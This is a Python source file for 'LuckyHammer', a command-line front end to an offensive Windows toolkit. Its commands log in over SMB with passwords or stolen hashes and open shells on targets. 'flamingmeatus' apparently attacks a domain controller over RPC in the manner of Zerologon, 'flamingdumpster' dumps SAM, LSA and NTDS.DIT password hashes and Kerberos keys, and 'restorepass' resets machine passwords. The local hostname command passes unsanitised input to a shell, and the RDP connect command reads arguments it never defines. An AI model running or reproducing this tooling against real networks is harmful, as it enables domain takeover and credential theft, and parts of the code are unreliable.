from cmd2 import Cmd
import cmd2
import asciiart
from smbext import SmbExt
from smbext import DIALECTS
from finishingnail import FinishingNail
from rdp import RdpConnection
from argparse import RawTextHelpFormatter
from helpers import *
from flamingmeatus import *
from flamingdumpster import *
from restorepassword import *

sessions = []
processes = []


# noinspection PyProtectedMember
class LuckyHammer(Cmd):
    SCANNER_CMD = 'Scanners Commands'
    SMBCONNECTION_CMD = 'SMB Connection Commands'
    RDP_CMD = 'RDP Commands'
    EXPLOIT_CMD = 'Exploit Commands'

    def __init__(self):
        super().__init__(persistent_history_file="./history.dat", persistent_history_length=1000)
        self.intro = asciiart.get_art("LUCKYHAMMER", False)
        self.prompt = 'LUCKYHAMMER> '
        self.self_in_py = True
        self.default_category = 'Built-in Commands'

    # Change prompt
    def change_prompt(self, line):
        self.prompt = '{0}'.format(line)

    smb_version = argparse.ArgumentParser()
    smb_version.add_argument('-i', '--ip', required=True, help='target or redirector ip')
    smb_version.add_argument('-p', '--port', required=True, help='target or redirector port')
    smb_version.add_argument('-l', '--legacy', action='store_true', help='adds smb v1 support')
    smb_version.add_argument('-t', '--target', required=True, help='Actual target ip')

    @cmd2.with_argparser(smb_version)
    @cmd2.with_category(SCANNER_CMD)
    def do_smbinfo(self, args):
        if args.legacy:
            """Query information about a machine using SMB v1"""
            smb1 = SmbExt(remoteName=args.ip, remoteHost=args.ip, sess_port=args.port, preferredDialect='NT LM 0.12')
            self.poutput("SMB info for {}".format(args.target))
            smb1.get_smbinfo()
        else:
            """Query information about a machine using SMB"""
            smb = SmbExt(remoteName=args.ip, remoteHost=args.ip, sess_port=args.port)
            self.poutput("SMB info for {}".format(args.target))
            smb.get_smbinfo("", "")

    # Parser for connect
    connect_parser = argparse.ArgumentParser()
    connect_group = connect_parser.add_mutually_exclusive_group(required=True)
    connect_parser.add_argument('-i', '--ip', required=True, help='target or redirector ip')
    connect_parser.add_argument('-p', '--port', required=True, help='target or redirector port')
    connect_parser.add_argument('-u', '--username', required=True, help='username to authenticate with')
    connect_group.add_argument('-P', '--password', help='password to authenticate with')
    connect_group.add_argument('-N', '--nthash', help='nt hash to authenticate with')
    connect_group.add_argument('-L', '--lmhash', help='lanman hash to authenticate with')
    connect_parser.add_argument('-d', '--domain', required=False, default='.', help='domain name')
    connect_parser.add_argument('-t', '--target', required=True, help='actual target IP')
    connect_parser.add_argument('-D', '--dialect', required=False, action='store_true',
                                help='SMB dialect to use ex. 1,2,3')

    @cmd2.with_argparser(connect_parser)
    @cmd2.with_category(SMBCONNECTION_CMD)
    def do_connect(self, args):
        """Establishes smb connection."""
        if args.dialect:
            for i, k in enumerate(DIALECTS):
                self.poutput("{}. {}".format(i + 1, DIALECTS[k]))
            choice = self.read_input("Please enter a dialect (Note: SMB 3.0.0 is only one that supports encryption): ")
            sess = SmbExt(remoteName=args.ip, remoteHost=args.ip, sess_port=args.port,
                          preferredDialect=list(DIALECTS)[int(choice) - 1])
        else:
            sess = SmbExt(remoteName=args.ip, remoteHost=args.ip, sess_port=args.port)
        if args.password:
            sess.login(args.username, args.password, args.domain)
        elif args.nthash:
            sess.login(user=args.username, nthash=args.nthash, domain=args.domain, password='')
        else:
            sess.login(user=args.username, lmhash=args.lmhash, domain=args.domain, password='')
        self.poutput("Session Established")
        sessions.append(sess)
        if sess.getDialect() == 'NT LM 0.12':
            build_smbv1_dict(sess)
        else:
            sess._Connection = sess._SMBConnection._Connection
            sess._Session = sess._SMBConnection._Session
        self.conn_info(sess)

    @staticmethod
    def conn_info(conn):
        """calls print_session_info with"""
        conn.print_info(conn.connection_info_list)
        conn.print_info(conn.session_info_list)
        conn.print_info(conn.os_info_list)

    # Argparser for sessions
    sessions_parser = argparse.ArgumentParser()
    sessions_parser.add_argument('-l', '--list', required=False, default=True, help='list sessions')

    @cmd2.with_argparser(sessions_parser)
    @cmd2.with_category(SMBCONNECTION_CMD)
    def do_sessions(self, args):
        """Lists established sessions"""
        if args.list:
            self.list_sessions()

    def list_sessions(self):
        for index, i in enumerate(sessions):
            self.poutput("\t{}. ID: {:<15}  IP: {:<15}  Username: {:<15}  "
                         "Domain: {:<10}  Dialect: {}".format(index + 1, i._Session['SessionID'],
                                                              i._Connection['ServerIP'],
                                                              i._Session['UserCredentials'][0],
                                                              i._Session['UserCredentials'][2],
                                                              DIALECTS[i.getDialect()]))

    # Argparser for interact
    interact_parser = argparse.ArgumentParser()
    interact_parser.add_argument('-s', '--session', required=False, help='session number to interact')

    @cmd2.with_argparser(interact_parser)
    @cmd2.with_category(SMBCONNECTION_CMD)
    def do_interact(self, args):
        """Interact with a session and get a shell"""
        if not args.session:
            self.poutput("Session List:")
            self.list_sessions()
            sess = self.read_input("Enter the number of the session you want to interact with: ")
            fina = FinishingNail(sessions[int(sess) - 1])
            fina.cmdloop()
        else:
            fina = FinishingNail(sessions[int(args.session) - 1])
            fina.cmdloop()

    # Argparser for rdp connection
    rdp_parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter)
    rdp_parser.add_argument('-i', '--ip', required=True, help='target or redirector ip')
    rdp_parser.add_argument('-p', '--port', default='3389', required=False,
                            help='target or redirector port. Default: 3389')
    rdp_parser.add_argument('-c', '--client', choices=['1', '2'], required=True,
                            help="select which RDP client to use - "
                                 "\n1: Windows Native RDP \n2: rdesktop")
    rdp_parser.add_argument('-u', '--username', help='username to authenticate with.')
    rdp_parser.add_argument('-d', '--domain', default='.', help='specify domain for user credentials. Defaults to '
                                                                'local (Ex:".\\User")')

    @cmd2.with_argparser(rdp_parser)
    @cmd2.with_category(RDP_CMD)
    def do_rdpconnect(self, args):
        RdpConnection(address=args.ip, port=args.port, client=args.client, user=args.username, domain=args.domain,
                      force_splash=args.splash, local_hostname=args.localhostname)

    # Argparser for rdp splash screen, attempts to force RDP splash
    splash_parser = argparse.ArgumentParser(
        description="Attempt to force RDP splash screen. Useful when enumerating Windows"
                    "OS versions and domain name.")
    splash_parser.add_argument('-i', '--ip', required=True, help='target or redirector ip')
    splash_parser.add_argument('-p', '--port', default='3389', required=False,
                               help='target or redirector port. Default: 3389')

    @cmd2.with_argparser(splash_parser)
    @cmd2.with_category(RDP_CMD)
    def do_getsplash(self, args):
        """Attempts to force rdp splash screen. Does not always work depending on server configuration"""
        splash = RdpConnection(address=args.ip, port=args.port)
        splash.get_splash()

    # Argparser to change local hostname
    changelocalname_parser = argparse.ArgumentParser(
        description="Change the local hostname. Windows hosts will need to be "
                    "restarted prior to changes taking effect. Used when "
                    "trying to match host naming conventions in a network.")
    changelocalname_parser.add_argument('-n', '--hostname', help='new hostname string')

    @cmd2.with_argparser(changelocalname_parser)
    @cmd2.with_category(RDP_CMD)
    def do_localhostname(self, args):
        """Changes local hostname. Windows hostname changes require a restart"""
        # Change local system hostname
        if "win" in sys.platform:
            os.system('powershell.exe Rename-Computer -NewName {}'.format(args.hostname))
        else:
            os.system('hostname -b {}'.format(args.hostname))
            self.poutput('Hostname changed: {}'.format(args.hostname))

    # Argparser to enumerate the
    getrdphostname_parser = argparse.ArgumentParser(
        description="Attempts to enumerate the target hostname and domain via RDP. "
                    "This will attempt to authenticate to the host and looks for "
                    "the 'Server Hello' packet for the hostname & domain information")

    @cmd2.with_argparser(getrdphostname_parser)
    @cmd2.with_category(RDP_CMD)
    def do_rdphostname(self, args):
        """Attempts to enumerate the target hostname and domain via RDP"""
        pass

    # Argparser for ...
    flme_parser = argparse.ArgumentParser()
    flme_parser.add_argument('-i', '--ip', required=True, help='ip of DC')
    flme_parser.add_argument('-n', '--name', required=True, help='Netbios name of DC')
    flme_parser.add_argument('-H', '--handle', required=False, default='\\\\', help='DC handle')

    @cmd2.with_argparser(flme_parser)
    @cmd2.with_category(EXPLOIT_CMD)
    def do_flamingmeatus(self, args):
        flme = FlamingMeatus(dc_name=args.name, dc_ip=args.ip, dc_handle=args.handle)
        flme.bind_rpc()
        flme.perform_attack()

    fldu_parser = argparse.ArgumentParser(add_help=True, description="Performs various techniques to dump secrets from "
                                                                     "the remote machine without executing any agent "
                                                                     "there.")

    fldu_parser.add_argument('target', action='store',
                             help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                  ' (if you want to parse local files)')
    fldu_parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    fldu_parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    fldu_parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    fldu_parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    fldu_parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    fldu_parser.add_argument('-sam', action='store', help='SAM hive to parse')
    fldu_parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    fldu_parser.add_argument('-resumefile', action='store',
                             help='resume file name to resume NTDS.DIT session dump (only '
                                  'available to DRSUAPI approach). This file will also be used to keep updating the '
                                  'session\'s '
                                  'state')
    fldu_parser.add_argument('-outputfile', action='store',
                             help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    fldu_parser.add_argument('-use-vss', action='store_true', default=False,
                             help='Use the VSS method insead of default DRSUAPI')
    fldu_parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec',
                             help='Remote exec '
                                  'method to use at target (only when using -use-vss). Default: smbexec')
    fldu_group = fldu_parser.add_argument_group('display options')
    fldu_group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                            help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI '
                                 'approach. '
                                 'Implies also -just-dc switch')
    fldu_group.add_argument('-just-dc', action='store_true', default=False,
                            help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    fldu_group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                            help='Extract only NTDS.DIT data (NTLM hashes only)')
    fldu_group.add_argument('-pwd-last-set', action='store_true', default=False,
                            help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile '
                                 'data')
    fldu_group.add_argument('-user-status', action='store_true', default=False,
                            help='Display whether or not the user is disabled')
    fldu_group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    fldu_group = fldu_parser.add_argument_group('authentication')

    fldu_group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                            help='NTLM hashes, format is LMHASH:NTHASH')
    fldu_group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    fldu_group.add_argument('-k', action="store_true",
                            help='Use Kerberos authentication. Grabs credentials from ccache file '
                                 '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, '
                                 'it will use the ones specified in the command line')
    fldu_group.add_argument('-aesKey', action="store", metavar="hex key",
                            help='AES key to use for Kerberos Authentication'
                                 ' (128 or 256 bits)')
    fldu_group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    fldu_group = fldu_parser.add_argument_group('connection')
    fldu_group.add_argument('-dc-ip', action='store', metavar="ip address",
                            help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    fldu_group.add_argument('-target-ip', action='store', metavar="ip address",
                            help='IP Address of the target machine. If omitted it will use whatever was specified as '
                                 'target. '
                                 'This is useful when target is the NetBIOS name and you cannot resolve it')

    @cmd2.with_category(EXPLOIT_CMD)
    @cmd2.with_argparser(fldu_parser)
    def do_flamingdumpster(self, args):
        logger.init(args.ts)

        if args.debug is True:
            logging.getLogger().setLevel(logging.DEBUG)
            # Print the Library's installation path
            logging.debug(version.getInstallationPath())
        else:
            pass

        import re

        domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
            args.target).groups('')

        # In case the password contains '@'
        if '@' in remoteName:
            password = password + '@' + remoteName.rpartition('@')[0]
            remoteName = remoteName.rpartition('@')[2]

        if args.just_dc_user is not None:
            if args.use_vss is True:
                logging.error('-just-dc-user switch is not supported in VSS mode')
                sys.exit(1)
            elif args.resumefile is not None:
                logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
                sys.exit(1)
            elif remoteName.upper() == 'LOCAL' and username == '':
                logging.error('-just-dc-user not compatible in LOCAL mode')
                sys.exit(1)
            else:
                # Having this switch on implies not asking for anything else.
                args.just_dc = True

        if args.use_vss is True and args.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
            sys.exit(1)

        if remoteName.upper() == 'LOCAL' and username == '' and args.resumefile is not None:
            logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
            sys.exit(1)

        if remoteName.upper() == 'LOCAL' and username == '':
            if args.system is None and args.bootkey is None:
                logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
                sys.exit(1)
        else:

            if args.target_ip is None:
                args.target_ip = remoteName

            if domain is None:
                domain = ''

            if args.keytab is not None:
                Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
                args.k = True

            if password == '' and username != '' and args.hashes is None and args.no_pass is False and \
                    args.aesKey is None:
                from getpass import getpass

                password = getpass("Password:")

            if args.aesKey is not None:
                args.k = True

        dumper = DumpSecrets(remoteName, username, password, domain, args)
        try:
            dumper.dump()
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)

    restore_parser = argparse.ArgumentParser()
    restore_parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    restore_group = restore_parser.add_argument_group('connection')
    restore_group.add_argument('-target-ip', action='store', metavar="ip address",
                               help='IP Address of the target machine. If omitted it will use whatever was specified '
                                    'as target. This is useful when target is the NetBIOS name and you cannot '
                                    'resolve it')
    restore_group.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445',
                               metavar="destination port",
                               help='Destination port to connect to SMB Server')
    restore_group.add_argument('-domain-sids', action='store_true',
                               help='Enumerate Domain SIDs (will likely forward requests to the DC)')
    restore_group = restore_parser.add_argument_group('authentication')
    restore_group.add_argument('-hexpass', action="store", help='Hex encoded plaintext password')
    restore_group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                               help='NTLM hashes, format is LMHASH:NTHASH')
    restore_group.add_argument('-no-pass', action="store_true",
                               help='don\'t ask for password (useful when proxying through smbrelayx)')

    @cmd2.with_argparser(restore_parser)
    @cmd2.with_category(EXPLOIT_CMD)
    def do_restorepass(self, args):
        # Explicitly changing the stdout encoding format
        if sys.stdout.encoding is None:
            # Output is redirected to a file
            sys.stdout = codecs.getwriter('utf8')(sys.stdout)
        print(version.BANNER)

        import re

        domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
            args.target).groups('')

        # In case the password contains '@'
        if '@' in remoteName:
            password = password + '@' + remoteName.rpartition('@')[0]
            remoteName = remoteName.rpartition('@')[2]

        if domain is None:
            domain = ''

        if password == '' and args.hexpass != '':
            password = unhexlify(args.hexpass)

        if password == '' and username != '' and args.hashes is None and args.no_pass is False:
            from getpass import getpass
            password = getpass("Password:")

        if args.target_ip is None:
            args.target_ip = remoteName

        action = ChangeMachinePassword(username, password, domain, int(args.port), args.hashes,
                                       args.domain_sids)
        action.dump(remoteName, args.target_ip)


'''

Template function set-up
#Argparser for ...
template_parser = argparse.ArgumentParser()
template_parser.add_argument('-i', '--ip', required=True, help='target or redirector ip')


@cmd2.with_argparser(template_parser)
    def do_something(self, args):
        """Function explanation statement here"""
        pass
'''
